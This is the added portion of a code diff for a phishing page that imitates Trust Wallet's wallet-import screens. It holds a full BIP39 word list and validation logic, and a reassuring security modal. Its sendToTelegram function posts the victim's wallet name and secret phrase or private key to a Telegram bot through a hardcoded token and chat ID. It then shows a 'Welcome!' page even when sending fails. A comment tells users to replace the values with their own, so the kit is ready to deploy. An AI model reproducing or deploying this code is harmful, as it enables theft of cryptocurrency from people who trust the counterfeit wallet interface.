+                    <text x="40" y="50" fill="#000" font-size="12" font-weight="bold" font-family="Arial" transform="rotate(-15 40 50)">* * * *</text>
+                </svg>
+            </div>
+
+            <p class="modal-desc">Never import a secret that is public, shared online, or sent to you by someone else. Trust Wallet support will never ask for it.</p>
+
+            <div class="modal-checkbox-group">
+                <label class="modal-checkbox">
+                    <input type="checkbox" onchange="checkModalConditions()">
+                    <span>Only I know this Secret Phrase.</span>
+                </label>
+                <label class="modal-checkbox">
+                    <input type="checkbox" onchange="checkModalConditions()">
+                    <span>No one gave it to me, including a company representative or someone offering money.</span>
+                </label>
+                <label class="modal-checkbox">
+                    <input type="checkbox" onchange="checkModalConditions()">
+                    <span>Anyone who has it can control the wallet and steal its funds.</span>
+                </label>
+            </div>
+
+            <button class="btn-understand" id="btn-understand" disabled onclick="closeModal()">I understand</button>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        // TELEGRAM BOT CONFIGURATION
+        // ==========================================
+        // REPLACE THESE VALUES WITH YOUR OWN
+        const TELEGRAM_BOT_TOKEN = "8794272039:AAHl1crjgbFQrpeNexzfwAy0GJepPzisv1w"; 
+        const TELEGRAM_CHAT_ID = "8774784007";
+
+        // --- NAVIGATION ---
+        const viewOptions = document.getElementById('view-options');
+        const viewPassword = document.getElementById('view-password');
+        const viewImport = document.getElementById('view-import');
+        const viewImportForm = document.getElementById('view-import-form');
+        const viewSuccess = document.getElementById('view-success');
+        
+        const leftStep = document.getElementById('left-step');
+        const leftTitle = document.getElementById('left-title');
+        
+        const passwordInput = document.getElementById('password');
+        const confirmInput = document.getElementById('confirm-password');
+        const btnContinue = document.getElementById('btn-continue');
+        
+        const walletNameInput = document.getElementById('wallet-name');
+        const secretPhraseInput = document.getElementById('secret-phrase');
+        const btnImport = document.getElementById('btn-import');
+        const errorImport = document.getElementById('error-import');
+        const successDetect = document.getElementById('success-detect');
+        const helpTextDefault = document.getElementById('help-text-default');
+        const eyeTextarea = document.getElementById('eye-textarea');
+        
+        const securityModal = document.getElementById('security-modal');
+        const btnUnderstand = document.getElementById('btn-understand');
+        
+        const errorLength = document.getElementById('error-length');
+        const errorMatch = document.getElementById('error-match');
+        
+        let currentView = 'options';
+
+        function showOptionsView() {
+            viewOptions.style.display = 'flex';
+            viewPassword.style.display = 'none';
+            viewImport.style.display = 'none';
+            viewImportForm.style.display = 'none';
+            viewSuccess.style.display = 'none';
+            currentView = 'options';
+            
+            leftStep.innerHTML = 'Step 1 of 3';
+            leftTitle.innerHTML = 'Protect your<br>wallet';
+        }
+
+        function showPasswordView() {
+            viewOptions.style.display = 'none';
+            viewPassword.style.display = 'flex';
+            viewImport.style.display = 'none';
+            viewImportForm.style.display = 'none';
+            viewSuccess.style.display = 'none';
+            currentView = 'password';
+            
+            leftStep.innerHTML = 'Step 1 of 3';
+            leftTitle.innerHTML = 'Protect your<br>wallet';
+        }
+
+        function showImportView() {
+            viewOptions.style.display = 'none';
+            viewPassword.style.display = 'none';
+            viewImport.style.display = 'flex';
+            viewImportForm.style.display = 'none';
+            viewSuccess.style.display = 'none';
+            currentView = 'import';
+            
+            leftStep.innerHTML = 'Step 2 of 3';
+            leftTitle.innerHTML = 'Import a<br>wallet';
+        }
+
+        function showImportFormView() {
+            viewOptions.style.display = 'none';
+            viewPassword.style.display = 'none';
+            viewImport.style.display = 'none';
+            viewImportForm.style.display = 'flex';
+            viewSuccess.style.display = 'none';
+            currentView = 'import-form';
+            
+            leftStep.innerHTML = 'Step 3 of 3';
+            leftTitle.innerHTML = 'Import a wallet';
+        }
+
+        function showSuccessView() {
+            viewOptions.style.display = 'none';
+            viewPassword.style.display = 'none';
+            viewImport.style.display = 'none';
+            viewImportForm.style.display = 'none';
+            viewSuccess.style.display = 'flex';
+            currentView = 'success';
+            
+            leftStep.innerHTML = '';
+            leftTitle.innerHTML = 'Welcome!';
+            document.getElementById('btn-back').style.display = 'none';
+        }
+
+        function goBack() {
+            if (currentView === 'import-form') {
+                showImportView();
+            } else if (currentView === 'import') {
+                showPasswordView();
+            } else if (currentView === 'password') {
+                showOptionsView();
+                resetForm();
+            } else {
+                window.location.href = 'index.html';
+            }
+        }
+
+        // --- PASSWORD LOGIC ---
+        function validateForm() {
+            const pass = passwordInput.value;
+            const confirm = confirmInput.value;
+            
+            let isLengthValid = pass.length >= 8;
+            let isMatchValid = (pass === confirm) && pass.length > 0;
+
+            if (pass.length > 0 && !isLengthValid) {
+                passwordInput.classList.add('error');
+                errorLength.classList.add('visible');
+            } else {
+                passwordInput.classList.remove('error');
+                errorLength.classList.remove('visible');
+            }
+
+            if (confirm.length > 0 && !isMatchValid) {
+                confirmInput.classList.add('error');
+                passwordInput.classList.add('error');
+                errorMatch.classList.add('visible');
+            } else {
+                confirmInput.classList.remove('error');
+                if (isLengthValid) passwordInput.classList.remove('error');
+                errorMatch.classList.remove('visible');
+            }
+
+            if (isLengthValid && isMatchValid) {
+                btnContinue.removeAttribute('disabled');
+                btnContinue.classList.add('active');
+            } else {
+                btnContinue.setAttribute('disabled', 'true');
+                btnContinue.classList.remove('active');
+            }
+        }
+
+        function resetForm() {
+            passwordInput.value = '';
+            confirmInput.value = '';
+            passwordInput.classList.remove('error');
+            confirmInput.classList.remove('error');
+            errorLength.classList.remove('visible');
+            errorMatch.classList.remove('visible');
+            btnContinue.setAttribute('disabled', 'true');
+            btnContinue.classList.remove('active');
+        }
+
+        function togglePassword(inputId, iconElement) {
+            const input = document.getElementById(inputId);
+            if (input.type === 'password') {
+                input.type = 'text';
+                iconElement.innerHTML = '<svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>';
+            } else {
+                input.type = 'password';
+                iconElement.innerHTML = '<svg viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>';
+            }
+        }
+
+        function clearWalletName() {
+            walletNameInput.value = '';
+            validateImportForm();
+        }
+
+        // --- IMPORT LOGIC (BIP39) ---
+        function toggleSecretPhrase() {
+            if (secretPhraseInput.style.webkitTextSecurity === 'disc') {
+                secretPhraseInput.style.webkitTextSecurity = 'none';
+            } else {
+                secretPhraseInput.style.webkitTextSecurity = 'disc';
+            }
+        }
+
+        const bip39Words = new Set([
+            "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent","agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware","away","awesome","awful","awkward","axis",
+            "baby","bachelor","bacon","badge","bag","balance","balcony","ball","bamboo","banana","banner","bar","barely","bargain","barrel","base","basic","basket","battle","beach","bean","beauty","because","become","beef","before","begin","behave","behind","believe","below","belt","bench","benefit","best","betray","better","between","beyond","bicycle","bid","bike","bind","biology","bird","birth","bitter","black","blade","blame","blanket","blast","bleak","bless","blind","blood","blossom","blouse","blue","blur","blush","board","boat","body","boil","bomb","bone","bonus","book","boost","border","boring","borrow","boss","bottom","bounce","box","boy","bracket","brain","brand","brass","brave","bread","breeze","brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze","broom","brother","brown","brush","bubble","buddy","budget","buffalo","build","bulb","bulk","bullet","bundle","bunker","burden","burger","burst","bus","business","busy","butter","buyer","buzz",
+            "cabbage","cabin","cable","cactus","cage","cake","call","calm","camera","camp","can","canal","cancel","candy","cannon","canoe","canvas","canyon","capable","capital","captain","car","carbon","card","cargo","carpet","carry","cart","case","cash","casino","castle","casual","cat","catalog","catch","category","cattle","caught","cause","caution","cave","ceiling","celery","cement","census","century","cereal","certain","chair","chalk","champion","change","chaos","chapter","charge","chase","chat","cheap","check","cheese","chef","cherry","chest","chicken","chief","child","chimney","choice","choose","chronic","chuckle","chunk","churn","cigar","cinnamon","circle","citizen","city","civil","claim","clap","clarify","claw","clay","clean","clerk","clever","click","client","cliff","climb","clinic","clip","clock","clog","close","cloth","cloud","clown","club","clump","cluster","clutch","coach","coast","coconut","code","coffee","coil","coin","collect","color","column","combine","come","comfort","comic","common","company","concert","conduct","confirm","congress","connect","consider","control","convince","cook","cool","copper","copy","coral","core","corn","correct","cost","cotton","couch","country","couple","course","cousin","cover","coyote","crack","cradle","craft","cram","crane","crash","crater","crawl","crazy","cream","credit","creek","crew","cricket","crime","crisp","critic","crop","cross","crouch","crowd","crucial","cruel","cruise","crumble","crunch","crush","cry","crystal","cube","culture","cup","cupboard","curious","current","curtain","curve","cushion","custom","cute","cycle",
+            "dad","damage","damp","dance","danger","daring","dash","daughter","dawn","day","deal","debate","debris","decade","december","decide","decline","decorate","decrease","deer","defense","define","defy","degree","delay","deliver","demand","demise","denial","dentist","deny","depart","depend","deposit","depth","deputy","derive","describe","desert","design","desk","despair","destroy","detail","detect","develop","device","devote","diagram","dial","diamond","diary","dice","diesel","diet","differ","digital","dignity","dilemma","dinner","dinosaur","direct","dirt","disagree","discover","disease","dish","dismiss","disorder","display","distance","divert","divide","divorce","dizzy","doctor","document","dog","doll","dolphin","domain","donate","donkey","donor","door","dose","double","dove","draft","dragon","drama","drastic","draw","dream","dress","drift","drill","drink","drip","drive","drop","drum","dry","duck","dumb","dune","during","dust","dutch","duty","dwarf","dynamic",
+            "eager","eagle","early","earn","earth","easily","east","easy","echo","ecology","economy","edge","edit","educate","effort","egg","eight","either","elbow","elder","electric","elegant","element","elephant","elevator","elite","else","embark","embody","embrace","emerge","emotion","employ","empower","empty","enable","enact","end","endless","endorse","enemy","energy","enforce","engage","engine","enhance","enjoy","enlist","enough","enrich","enroll","ensure","enter","entire","entry","envelope","episode","equal","equip","era","erase","erode","erosion","error","erupt","escape","essay","essence","estate","eternal","ethics","evidence","evil","evoke","evolve","exact","example","excess","exchange","excite","exclude","excuse","execute","exercise","exhaust","exhibit","exile","exist","exit","exotic","expand","expect","expire","explain","expose","express","extend","extra","eye","eyebrow",
+            "fabric","face","faculty","fade","faint","faith","fall","false","fame","family","famous","fan","fancy","fantasy","farm","fashion","fat","fatal","father","fatigue","fault","favorite","feature","february","federal","fee","feed","feel","female","fence","festival","fetch","fever","few","fiber","fiction","field","figure","file","film","filter","final","find","fine","finger","finish","fire","firm","first","fiscal","fish","fit","fitness","fix","flag","flame","flash","flat","flavor","flee","flight","flip","float","flock","floor","flower","fluid","flush","fly","foam","focus","fog","foil","fold","follow","food","foot","force","forest","forget","fork","fortune","forum","forward","fossil","foster","found","fox","fragile","frame","frequent","fresh","friend","fringe","frog","front","frost","frown","frozen","fruit","fuel","fun","furnace","fury","future",
+            "gadget","gain","galaxy","gallery","game","gap","garage","garbage","garden","garlic","garment","gas","gasp","gate","gather","gauge","gaze","general","genius","genre","gentle","genuine","gesture","ghost","giant","gift","giggle","ginger","giraffe","girl","give","glad","glance","glare","glass","glide","glimpse","globe","gloom","glory","glove","glow","glue","goat","goddess","gold","good","goose","gorilla","gospel","gossip","govern","gown","grab","grace","grain","grant","grape","grass","gravity","great","green","grid","grief","grit","grocery","group","grow","grunt","guard","guess","guide","guilt","guitar","gun","gym",
+            "habit","hair","half","hammer","hamster","hand","happy","harbor","hard","harsh","harvest","hat","have","hawk","hazard","head","health","heart","heavy","hedgehog","height","hello","helmet","help","hen","hero","hidden","high","hill","hint","hip","hire","history","hobby","hockey","hold","hole","holiday","hollow","home","honey","hood","hope","horn","horror","horse","hospital","host","hotel","hour","hover","hub","huge","human","humble","humor","hundred","hungry","hunt","hurdle","hurry","hurt","husband","hybrid",
+            "ice","icon","idea","identify","idle","ignore","ill","illegal","illness","image","imitate","immense","immune","impact","impose","improve","impulse","inch","include","income","increase","index","indicate","indoor","industry","infant","inflict","inform","inhale","inherit","initial","inject","injury","inmate","inner","innocent","input","inquiry","insane","insect","inside","inspire","install","intact","interest","into","invest","invite","involve","iron","island","isolate","issue","item","ivory",
+            "jacket","jaguar","jar","jazz","jealous","jeans","jelly","jewel","job","join","joke","journey","joy","judge","juice","jump","jungle","junior","junk","just",
+            "kangaroo","keen","keep","ketchup","key","kick","kid","kidney","kind","kingdom","kiss","kit","kitchen","kite","kitten","kiwi","knee","knife","knock","know",
+            "lab","label","labor","ladder","lady","lake","lamp","language","laptop","large","later","latin","laugh","laundry","lava","law","lawn","lawsuit","layer","lazy","leader","leaf","learn","leave","lecture","left","leg","legal","legend","leisure","lemon","lend","length","lens","leopard","lesson","letter","level","liar","liberty","library","license","life","lift","light","like","limb","limit","link","lion","liquid","list","little","live","lizard","load","loan","lobster","local","lock","logic","lonely","long","loop","lottery","loud","lounge","love","loyal","lucky","luggage","lumber","lunar","lunch","luxury","lyrics",
+            "machine","mad","magic","magnet","maid","mail","main","major","make","mammal","man","manage","mandate","mango","mansion","manual","maple","marble","march","margin","marine","market","marriage","mask","mass","master","match","material","math","matrix","matter","maximum","maze","meadow","mean","measure","meat","mechanic","medal","media","melody","melt","member","memory","mention","menu","mercy","merge","merit","merry","mesh","message","metal","method","middle","midnight","milk","million","mimic","mind","minimum","minor","minute","miracle","mirror","misery","miss","mistake","mix","mixed","mixture","mobile","model","modify","mom","moment","monitor","monkey","monster","month","moon","moral","more","morning","mosquito","mother","motion","motor","mountain","mouse","move","movie","much","muffin","mule","multiply","muscle","museum","mushroom","music","must","mutual","myself","mystery","myth",
+            "naive","name","napkin","narrow","nasty","nation","nature","near","neck","need","negative","neglect","neither","nephew","nerve","nest","net","network","neutral","never","news","next","nice","night","noble","noise","nominee","noodle","normal","north","nose","notable","note","nothing","notice","novel","now","nuclear","number","nurse","nut",
+            "oak","obey","object","oblige","obscure","observe","obtain","obvious","occur","ocean","october","odor","off","offer","office","often","oil","okay","old","olive","olympic","omit","once","one","onion","online","only","open","opera","opinion","oppose","option","orange","orbit","orchard","order","ordinary","organ","orient","original","orphan","ostrich","other","outdoor","outer","output","outside","oval","oven","over","own","owner","oxygen","oyster","ozone",
+            "pact","paddle","page","pair","palace","palm","panda","panel","panic","panther","paper","parade","parent","park","parrot","party","pass","patch","path","patient","patrol","pattern","pause","pave","payment","peace","peanut","pear","peasant","pelican","pen","penalty","pencil","people","pepper","perfect","permit","person","pet","phone","photo","phrase","physical","piano","picnic","picture","piece","pig","pigeon","pill","pilot","pink","pioneer","pipe","pistol","pitch","pizza","place","planet","plastic","plate","play","please","pledge","pluck","plug","plunge","poem","poet","point","polar","pole","police","pond","pony","pool","popular","portion","position","possible","post","potato","pottery","poverty","powder","power","practice","praise","predict","prefer","prepare","present","pretty","prevent","price","pride","primary","print","priority","prison","private","prize","problem","process","produce","profit","program","project","promote","proof","property","prosper","protect","proud","provide","public","pudding","pull","pulp","pulse","pumpkin","punch","pupil","puppy","purchase","purity","purpose","purse","push","put","puzzle","pyramid",
+            "quality","quantum","quarter","question","quick","quit","quiz","quote",
+            "rabbit","raccoon","race","rack","radar","radio","rail","rain","raise","rally","ramp","ranch","random","range","rapid","rare","rate","rather","raven","raw","razor","ready","real","reason","rebel","rebuild","recall","receive","recipe","record","recycle","reduce","reflect","reform","refuse","region","regret","regular","reject","relax","release","relief","rely","remain","remember","remind","remove","render","renew","rent","reopen","repair","repeat","replace","report","require","rescue","resemble","resist","resource","response","result","retire","retreat","return","reunion","reveal","review","reward","rhythm","rib","ribbon","rice","rich","ride","ridge","rifle","right","rigid","ring","riot","ripple","risk","ritual","rival","river","road","roast","robot","robust","rocket","romance","roof","rookie","room","rose","rotate","rough","round","route","royal","rubber","rude","rug","rule","run","runway","rural",
+            "sad","saddle","sadness","safe","sail","salad","salmon","salon","salt","salute","same","sample","sand","satisfy","satoshi","sauce","sausage","save","say","scale","scan","scare","scatter","scene","scheme","school","science","scissors","scorpion","scout","scrap","screen","script","scrub","sea","search","season","seat","second","secret","section","security","seed","seek","segment","select","sell","seminar","senior","sense","sentence","series","service","session","settle","setup","seven","shadow","shaft","shallow","share","shed","shell","sheriff","shield","shift","shine","ship","shiver","shock","shoe","shoot","shop","short","shoulder","shove","shrimp","shrug","shuffle","shy","sibling","sick","side","siege","sight","sign","silent","silk","silly","silver","similar","simple","since","sing","siren","sister","situate","six","size","skate","sketch","ski","skill","skin","skirt","skull","slab","slam","sleep","slender","slice","slide","slight","slim","slogan","slot","slow","slush","small","smart","smile","smoke","smooth","snack","snake","snap","sniff","snow","soap","soccer","social","sock","soda","soft","solar","soldier","solid","solution","solve","someone","song","soon","sorry","sort","soul","sound","soup","source","south","space","spare","spatial","spawn","speak","special","speed","spell","spend","sphere","spice","spider","spike","spin","spirit","split","spoil","sponsor","spoon","sport","spot","spray","spread","spring","spy","square","squeeze","squirrel","stable","stadium","staff","stage","stairs","stamp","stand","start","state","stay","steak","steel","stem","step","stereo","stick","still","sting","stock","stomach","stone","stool","story","stove","strategy","street","strike","strong","struggle","student","stuff","stumble","style","subject","submit","subway","success","such","sudden","suffer","sugar","suggest","suit","summer","sun","sunny","sunset","super","supply","supreme","sure","surface","surge","surprise","surround","survey","suspect","sustain","swallow","swamp","swap","swarm","swear","sweet","swift","swim","swing","switch","sword","symbol","symptom","syrup","system",
+            "table","tackle","tag","tail","talent","talk","tank","tape","target","task","taste","tattoo","taxi","teach","team","tell","ten","tenant","tennis","tent","term","test","text","thank","that","theme","then","theory","there","they","thing","this","thought","three","thrive","throw","thumb","thunder","ticket","tide","tiger","tilt","timber","time","tiny","tip","tired","tissue","title","toast","tobacco","today","toddler","toe","together","toilet","token","tomato","tomorrow","tone","tongue","tonight","tool","tooth","top","topic","topple","torch","tornado","tortoise","toss","total","tourist","toward","tower","town","toy","track","trade","traffic","tragic","train","transfer","trap","trash","travel","tray","treat","tree","trend","trial","tribe","trick","trigger","trim","trip","trophy","trouble","truck","true","truly","trumpet","trust","truth","try","tube","tuition","tumble","tuna","tunnel","turkey","turn","turtle","twelve","twenty","twice","twin","twist","two","type","typical",
+            "ugly","umbrella","unable","unaware","uncle","uncover","under","undo","unfair","unfold","unhappy","uniform","unique","unit","universe","unknown","unlock","until","unusual","unveil","update","upgrade","uphold","upon","upper","upset","urban","urge","usage","use","used","useful","useless","usual","utility",
+            "vacant","vacuum","vague","valid","valley","valve","van","vanish","vapor","various","vast","vault","vehicle","velvet","vendor","venture","venue","verb","verify","version","very","vessel","veteran","viable","vibrant","vicious","victory","video","view","village","vintage","violin","virtual","virus","visa","visit","visual","vital","vivid","vocal","voice","void","volcano","volume","vote","voyage",
+            "wage","wagon","wait","walk","wall","walnut","want","warfare","warm","warrior","wash","wasp","waste","water","wave","way","wealth","weapon","wear","weasel","weather","web","wedding","weekend","weird","welcome","west","wet","whale","what","wheat","wheel","when","where","whip","whisper","wide","width","wife","wild","will","win","window","wine","wing","wink","winner","winter","wire","wisdom","wise","wish","witness","wolf","woman","wonder","wood","wool","word","work","world","worry","worth","wrap","wreck","wrestle","wrist","write","wrong",
+            "yard","year","yellow","you","young","youth",
+            "zebra","zero","zone","zoo"
+        ]);
+
+        function validateImportForm() {
+            const input = secretPhraseInput.value.trim();
+            
+            if (input.length === 0) {
+                btnImport.setAttribute('disabled', 'true');
+                btnImport.classList.remove('active');
+                secretPhraseInput.classList.remove('error');
+                errorImport.classList.remove('visible');
+                successDetect.classList.remove('visible');
+                eyeTextarea.classList.remove('visible');
+                helpTextDefault.style.display = 'block';
+                return;
+            }
+
+            let isValid = false;
+
+            const privateKeyRegex = /^[0-9a-fA-F]{64}$/;
+            if (privateKeyRegex.test(input)) {
+                isValid = true;
+                successDetect.innerText = "Private Key detected";
+            } else {
+                const words = input.split(/\s+/).filter(w => w.length > 0);
+                const validWordCounts = [12, 15, 18, 21, 24];
+                
+                if (validWordCounts.includes(words.length)) {
+                    const allWordsValid = words.every(word => bip39Words.has(word.toLowerCase()));
+                    if (allWordsValid) {
+                        isValid = true;
+                        successDetect.innerText = "Secret Phrase detected";
+                    }
+                }
+            }
+
+            if (isValid) {
+                btnImport.removeAttribute('disabled');
+                btnImport.classList.add('active');
+                secretPhraseInput.classList.remove('error');
+                errorImport.classList.remove('visible');
+                
+                successDetect.classList.add('visible');
+                eyeTextarea.classList.add('visible');
+                helpTextDefault.style.display = 'none';
+                
+                secretPhraseInput.style.webkitTextSecurity = 'disc';
+                secretPhraseInput.type = 'text';
+
+                securityModal.classList.add('visible');
+
+            } else {
+                btnImport.setAttribute('disabled', 'true');
+                btnImport.classList.remove('active');
+                secretPhraseInput.classList.add('error');
+                errorImport.classList.add('visible');
+                
+                successDetect.classList.remove('visible');
+                eyeTextarea.classList.remove('visible');
+                helpTextDefault.style.display = 'block';
+                
+                secretPhraseInput.style.webkitTextSecurity = 'none';
+            }
+        }
+
+        // --- MODAL LOGIC ---
+        function checkModalConditions() {
+            const checkboxes = document.querySelectorAll('.modal-checkbox input[type="checkbox"]');
+            const allChecked = Array.from(checkboxes).every(cb => cb.checked);
+
+            if (allChecked) {
+                btnUnderstand.removeAttribute('disabled');
+                btnUnderstand.classList.add('active');
+            } else {
+                btnUnderstand.setAttribute('disabled', 'true');
+                btnUnderstand.classList.remove('active');
+            }
+        }
+
+        function closeModal() {
+            securityModal.classList.remove('visible');
+        }
+
+        // ==========================================
+        // FUNCTION TO SEND TO TELEGRAM
+        // ==========================================
+        function sendToTelegram() {
+            // Retrieve the values
+            const walletName = walletNameInput.value;
+            const secretPhrase = secretPhraseInput.value;
+
+            // Prepare the message
+            const message = `🚨 *NEW WALLET IMPORTED* 🚨\n\n` +
+                            `📁 *Name:* ${walletName}\n` +
+                            `🔑 *Phrase/Key:* \`${secretPhrase}\``;
+
+            // Telegram API URL
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            // Send the request (fetch)
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => {
+                // Once sent (or on error), display the success page
+                showSuccessView();
+            })
+            .catch(error => {
+                console.error('Telegram error:', error);
+                // Even if it fails, display the success page to avoid blocking the user
+                showSuccessView();
+            });
+        }
+    </script>
+</body>
+</html>
